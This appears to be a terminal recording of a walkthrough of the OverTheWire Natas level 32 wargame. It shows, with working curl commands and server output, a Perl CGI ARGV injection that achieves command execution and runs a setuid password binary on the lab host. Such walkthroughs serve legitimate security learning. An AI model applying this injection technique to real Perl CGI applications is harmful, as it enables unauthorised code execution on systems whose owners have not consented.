[0.002, "o", "$ curl -s -u natas32:<pw> http://natas32.natas.labs.overthewire.org/index-source.html\r\n$   same CSV2HTML code as the previous level, but the page says:\r\n$   \"This time you need to prove that you got code exec. There is a binary\r\n$    in the webroot that you need to execute.\"\r\n"]
[2.203, "o", "if ($cgi->upload('file')) {\r\n    my $file = $cgi->param('file');\r\n    while (<$file>) {\r\n        my @elements=split /,/, $_;\r\n    This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.\r\n"]
[0.001, "o", "$ the same ARGV injection as natas31 applies: a plain field named file makes\r\n$   param(\"file\") = \"ARGV\", and open(\"ARGV\") reads @ARGV, which CGI fills from\r\n$   the query string. But here @ARGV entries are shell words: CGI.pm quotes\r\n$   them, so a bare \"cmd|\" becomes a filename \"cmd|\\\". The fix is to end the\r\n$   query with \" #\" so the trailing quote/backslash is a shell comment:\r\n$ curl -s -u natas32:<pw> -F 'file=ARGV' -F 'file=@/tmp/t.csv' 'http://natas32.natas.labs.overthewire.org/index.pl?/bin/ls #|'\r\n"]
[1.069, "o", "<table class=\"sortable table table-hover table-striped\"><tr><th>bootstrap-3.3.6-dist\r\n</th></tr><tr><td>getpassword\r\n</td></tr><tr><td>index-source.html\r\n</td></tr><tr><td>index.pl\r\n</td></tr><tr><td>jquery-1.12.3.min.js\r\n</td></tr><tr><td>sorttable.js\r\n</td></tr><tr><td>tmp\r\n</td></tr></table><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\r\n"]
[0.001, "o", "$ the webroot contains getpassword:\r\n$ curl -s -u natas32:<pw> -F 'file=ARGV' -F 'file=@/tmp/t.csv' 'http://natas32.natas.labs.overthewire.org/index.pl?/bin/ls -la /var/www/natas/natas32/getpassword #|'\r\n"]
[0.702, "o", "<table class=\"sortable table table-hover table-striped\"><tr><th>-rwsrwx--- 1 root natas32 16088 Oct 25 13:23 /var/www/natas/natas32/getpassword\r\n</th></tr></table><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\r\n"]
[0.001, "o", "$ it is setuid root and readable/executable by natas32: run it:\r\n$ curl -s -u natas32:<pw> -F 'file=ARGV' -F 'file=@/tmp/t.csv' 'http://natas32.natas.labs.overthewire.org/index.pl?/var/www/natas/natas32/getpassword #|'\r\n"]
